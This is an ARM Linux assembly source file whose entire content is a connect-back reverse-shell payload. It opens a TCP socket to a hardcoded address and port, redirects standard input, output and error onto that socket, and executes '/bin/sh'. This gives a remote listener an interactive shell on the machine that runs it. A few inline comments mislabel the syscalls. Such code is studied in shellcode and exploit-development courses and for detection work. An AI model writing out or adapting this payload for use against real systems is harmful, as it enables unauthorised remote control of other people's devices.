.global _start
_start:
 
  @ sockfd = socket(int socket_family, int socket_type, int protocol);
  mov r0, #2              @ PF_INET = 2
  mov r1, #1              @ SOCK_STREAM = 1
  mov r2, #0              @ IPPROTO_IP = 0
  ldr r7, =#281           @ socketcall
  swi 0
 
  @ r0 contains the fd returned by the syscall
  mov r6, r0 @ file descriptor
 
  @ bind the file descriptor to an address/port
  @ int connect

  adr r1, _sockaddr       @ sockaddr struct
  mov r2, #0x10           @ addrlen
  mov r0, r6              @ mov sockfd into r0
  ldr r7, =#283           @ connect syscall 
  swi 0
 
  @ Redirect stdin, stdout and stderr via dup2
  @ r0 = accepted socket 
  mov r1, #2              @ counter stdin(0), stdout(1) and stderr(2)
  loop:
    mov r0, r6
    mov r7, #63           @ dup2 syscall
    swi 0
    sub r1, r1, #1        @ decrement counter
    cmp r1, #-1           @ compare r1 with -1
    bne loop              @ if the result is not equal jmp to loop
 
  @ int execve(const char *filename, char *const argv[],char *const envp[]);
  adr r0, _sh
  mov r1, #0              @ argv=NULL
  mov r2, r1              @ envp=NULL
  mov r7, #11             @ exceve syscall
  swi 0
 
_exit:
  mov r0, #0
  mov r7, #1
  swi 0                   @ exit(0)

_sh: 
  .asciz "/bin/sh"

_sockaddr:
  .hword 2                @ sin_family
  .hword 0xb315           @ sin_port
  .word  0x0100a8c0       @ sin_addr
  .byte  0,0,0,0,0,0,0,0  @ sin_zero 